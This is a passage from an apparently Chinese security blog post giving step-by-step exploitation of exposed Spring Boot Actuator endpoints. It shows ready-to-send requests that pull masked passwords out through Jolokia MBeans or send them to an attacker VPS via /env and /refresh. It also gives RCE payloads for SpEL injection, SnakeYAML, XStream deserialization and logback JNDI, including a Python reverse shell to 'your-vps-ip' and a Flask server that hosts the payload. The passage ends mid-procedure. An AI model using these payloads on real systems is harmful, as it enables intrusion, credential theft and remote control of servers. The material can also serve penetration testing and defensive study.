<ul>
<li><code>/trace</code>、<code>/actuator/httptrace</code></li>
</ul>
<p>​    一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
<h4 id="获取被星号脱敏的密码的明文"><a href="#获取被星号脱敏的密码的明文" class="headerlink" title="获取被星号脱敏的密码的明文"></a>获取被星号脱敏的密码的明文</h4><blockquote>
<p>访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>
<h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>利用条件：</p>
<ul>
<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
<li>目标使用了 <code>jolokia-core</code> 依赖（请求<code>/jolokia/list</code>接口有数据就说明引用了）</li>
</ul>
<p>利用方法：</p>
<p>步骤一：找到想要获取的属性名</p>
<p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
<p>步骤二：<code>jolokia</code> 调用相关 <code>Mbean</code> 获取明文</p>
<p>将下面示例中的 <code>security.user.password</code> 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 <code>value</code> 键中。</p>
<ul>
<li>调用 <code>org.springframework.boot</code> Mbean</li>
</ul>
<blockquote>
<p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p>
</blockquote>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>测试读取星号脱敏的数据库密码password</p>
<p><img src="https://s2.loli.net/2022/06/26/W2tLDB63FVEezAx.png" alt="image-20220626015318831"></p>
<p>成功读取</p>
<p><img src="https://s2.loli.net/2022/06/26/kUdXcmYvgAx7Vlo.png" alt="image-20220626014907676"></p>
<ul>
<li>调用 <code>org.springframework.cloud.context.environment</code> Mbean</li>
</ul>
<blockquote>
<p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法，需要项目配置有spring cloud相关的依赖</p>
</blockquote>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;op</span><br></pre></td></tr></table></figure>

<p>测试如下</p>
<p><img src="https://s2.loli.net/2022/06/26/JIx6ydSPQTlaMF7.png" alt="image-20220626015237144"></p>
<ul>
<li>调用其他Mbean</li>
</ul>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>利用条件：</p>
<ul>
<li>可以 GET 请求目标网站的 <code>/env</code></li>
<li>可以 POST 请求目标网站的 <code>/env</code></li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>
<p>利用方法：</p>
<p>步骤一：找到想要获取的属性名</p>
<p>步骤二：使用nc监听 HTTP 请求</p>
<p>例如，在vps上监听80端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvk 80</span><br></pre></td></tr></table></figure>

<p>步骤三：设置 <code>eureka.client.serviceUrl.defaultZone</code> 属性</p>
<p>将下面 <code>http://value:$&#123;security.user.password&#125;@your-vps-ip</code> 中的 <code>security.user.password</code> 换成自己想要获取的对应的星号 * 遮掩的属性名；<code>your-vps-ip</code> 换成自己外网服务器的真实 ip 地址。</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://value:$&#123;security.user.password&#125;@your-vps-ip</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:$&#123;security.user.password&#125;@your-vps-ip&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>步骤四：刷新配置</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>

<p>步骤五：解码属性值</p>
<p>此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic dmFsdWU6MTIzNDU2</span><br></pre></td></tr></table></figure>

<p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 * 脱敏前的属性值明文。</p>
<p>测试：</p>
<p>vps监听80端口，并通过post方式向<code>/env</code>接口设置如下值</p>
<p><img src="https://s2.loli.net/2022/06/26/rCq3svHtY7dNhlG.png" alt="image-20220626015529934"></p>
<p>再post请求<code>/refresh</code>接口即可在vps上看到请求信息</p>
<p><img src="https://s2.loli.net/2022/06/26/X5zWLoJ8fZ6exgc.png" alt="image-20220626015602947"></p>
<p>解密base64编码值</p>
<p><img src="https://s2.loli.net/2022/06/26/wkvbf8q2PYcHp9E.png" alt="image-20220626015619429"></p>
<h5 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h5><p>利用条件：</p>
<ul>
<li>通过 POST <code>/env</code> 设置属性触发目标对外网指定地址发起任意 http 请求</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>
<p>利用方法：</p>
<p>步骤一：找到想要获取的属性名</p>
<p>步骤二：使用nc监听 HTTP 请求</p>
<p>在vps上监听80端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvk 80</span><br></pre></td></tr></table></figure>

<p>步骤三：触发对外 <code>http</code> 请求</p>
<ul>
<li><code>spring.cloud.bootstrap.location</code> 方法（<strong>适用于</strong>明文数据中有特殊 url 字符的情况）</li>
</ul>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip/?=$&#123;security.user.password&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/?=$&#123;security.user.password&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p><img src="https://s2.loli.net/2022/06/26/ofE6mMjHDyNekWT.png" alt="image-20220626015657074"></p>
<p>请求<code>/refresh</code>接口，vps接收到外带的请求，成功带出属性值</p>
<p><img src="https://s2.loli.net/2022/06/26/PUinxFDRgQhsj9y.png" alt="image-20220626020436695"></p>
<ul>
<li><code>eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）</li>
</ul>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/$&#123;security.user.password&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/$&#123;security.user.password&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p><img src="https://s2.loli.net/2022/06/26/apT6Jh7bqymHRUK.png" alt="image-20220626015730753"></p>
<p>vps监听到请求</p>
<p><img src="https://s2.loli.net/2022/06/26/dTAgUN2tVWZsxXP.png" alt="image-20220626015708272"></p>
<p>如果读取的属性值中存在特殊字符时，可能会出现读取不全的情况，如下：</p>
<p><img src="https://s2.loli.net/2022/06/26/hzrHQXGCo9vdmIL.png" alt="image-20220626015803160"></p>
<p>实际设置的密码是</p>
<p><img src="https://s2.loli.net/2022/06/26/yjEVJrzs7Ti9MGd.png" alt="image-20220626020549710"></p>
<p>步骤四：刷新配置</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>

<h5 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h5><p>利用条件：</p>
<ul>
<li>可正常 GET 请求目标 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口</li>
</ul>
<p>利用方法：</p>
<p>步骤一：找到想要获取的属性名</p>
<p>步骤二：下载 jvm heap 信息</p>
<blockquote>
<p>下载的 heapdump 文件大小通常在 50M—500M 之间</p>
</blockquote>
<p>步骤三：使用 MAT 获得 jvm heap中的密码明文</p>
<ul>
<li>使用 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 <strong>OQL</strong> 语句</li>
</ul>
<p>通过查询如下语法，获取heapdump文件中所有包含”password”属性的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>

<ul>
<li>还可以采用  <a href="https://github.com/wyzxxz/heapdump_tool">heapdump_tool</a>  命令行方式一键查询，更加方便</li>
</ul>
<h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><h4 id="whitelabel-error-page-SpEL-RCE"><a href="#whitelabel-error-page-SpEL-RCE" class="headerlink" title="whitelabel error page SpEL RCE"></a>whitelabel error page SpEL RCE</h4><p>利用条件：</p>
<ul>
<li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li>
<li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li>
</ul>
<p>利用方法：</p>
<p>步骤一：找到一个正常传参处</p>
<p>比如发现访问 <code>/article?id=xxx</code> ，页面会报状态码为 500 的错误： <code>Whitelabel Error Page</code>。</p>
<p>步骤二：执行SpEL表达式</p>
<p>输入 <code>/article?id=$&#123;7*7&#125;</code> ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p>
<p>为了方便执行java代码，先将字符串格式转换成<code>0x**</code> java 字节形式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;calc&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>执行 <code>calc</code> 命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x63,0x61,0x6c,0x63&#125;))&#125;</span><br></pre></td></tr></table></figure>

<p>测试结果如下：</p>
<p><img src="https://s2.loli.net/2022/06/26/wjI7TEsmuv6Pyip.png" alt="image-20220626020617831"></p>
<p>漏洞原理：</p>
<ol>
<li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
<li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li>
<li>其中 <code>$&#123;&#125;</code> 包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li>
</ol>
<h4 id="spring-cloud-SnakeYAML-RCE"><a href="#spring-cloud-SnakeYAML-RCE" class="headerlink" title="spring cloud SnakeYAML RCE"></a>spring cloud SnakeYAML RCE</h4><p>利用条件：</p>
<ul>
<li>可以 POST 请求目标网站 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li>
<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>
<p>利用方法：</p>
<p>步骤一：托管 yml 和 jar文件</p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer <span class="number">80</span></span><br><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p>在网站根目录下放置后缀为 <code>yml</code> 的文件 <code>example.yml</code>，内容如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://your-vps-ip/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>在网站根目录下放置后缀为 <code>jar</code> 的文件 <code>example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a>。</p>
<p>步骤二：设置 <code>spring.cloud.bootstrap.location</code> 属性</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip/example.yml</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>步骤三：刷新配置</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p>POST设置属性</p>
<p><img src="https://s2.loli.net/2022/06/26/vbYZOWCuUTfIoeG.png" alt="image-20220626020637203"></p>
<p>vps监听80端口，刷新配置-请求 <code>/refresh</code> 接口，即可触发RCE</p>
<p><img src="https://s2.loli.net/2022/06/26/NYBjaivS7VhMD12.png" alt="image-20220626020650368"></p>
<p><img src="https://s2.loli.net/2022/06/26/4iUmsAfW2VjP5H1.png" alt="image-20220626020853440"></p>
<p>漏洞原理：</p>
<ol>
<li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li>
<li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li>
<li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li>
<li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li>
<li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li>
<li>实例化类时执行恶意代码，造成 RCE 漏洞</li>
</ol>
<h4 id="eureka-xstream-deserialization-RCE"><a href="#eureka-xstream-deserialization-RCE" class="headerlink" title="eureka xstream deserialization RCE"></a>eureka xstream deserialization RCE</h4><p>利用条件：</p>
<ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标使用的 <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li>
<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>
<p>步骤一：架设响应恶意XStream payload网站</p>
<p>提供一个依赖 Flask 并符合要求的python脚本，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p>
<p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p>
<blockquote>
<p> <command><string>command</string></command>，标签中编写要执行的命令即可</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># -**- Author: LandGrey -**-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">catch_all</span>(<span class="params">path</span>):</span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;command&gt;</span></span><br><span class="line"><span class="string">                       &lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                       &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                       &lt;string&gt;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-vps-ip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>步骤二：监听反弹shell的端口</p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure>

<p>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>步骤四：刷新配置</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p>POST设置属性值</p>
<p><img src="https://s2.loli.net/2022/06/26/3sv71X6NEyZuaK5.png" alt="image-20220626021217346"></p>
<p>vps上运行python脚本</p>
<p><img src="https://s2.loli.net/2022/06/26/5ySDI1OhU4vLpdP.png" alt="image-20220626021321200"></p>
<p>这里测试弹出计算器成功</p>
<p><img src="https://s2.loli.net/2022/06/26/hAPJgHyWwGFRCVj.png" alt="image-20220626021352878"></p>
<h4 id="jolokia-logback-JNDI-RCE"><a href="#jolokia-logback-JNDI-RCE" class="headerlink" title="jolokia logback JNDI RCE"></a>jolokia logback JNDI RCE</h4><p>利用条件：</p>
<ul>
<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</li>
</ul>
<p>利用方法：</p>
<p>步骤一：查看已存在的 MBeans</p>
<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p>
<p>步骤二：托管 xml 文件</p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code> 文件，内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;ldap://your-vps-ip:1389/JNDIObject&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>步骤三：准备要执行的 Java 代码</p>
<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a> <code>JNDIObject.java</code>，</p>
<p>使用兼容低版本 jdk 的方式编译：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac -source 1.5 -target 1.5 JNDIObject.java</span><br></pre></td></tr></table></figure>

<p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
<p>步骤四：架设恶意 ldap 服务</p>
<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389</span><br></pre></td></tr></table></figure>

<p>步骤五：监听反弹 shell 的端口</p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lv 443</span><br></pre></td></tr></table></figure>

<p>步骤六：从外部 URL 地址加载日志配置文件</p>
<blockquote>
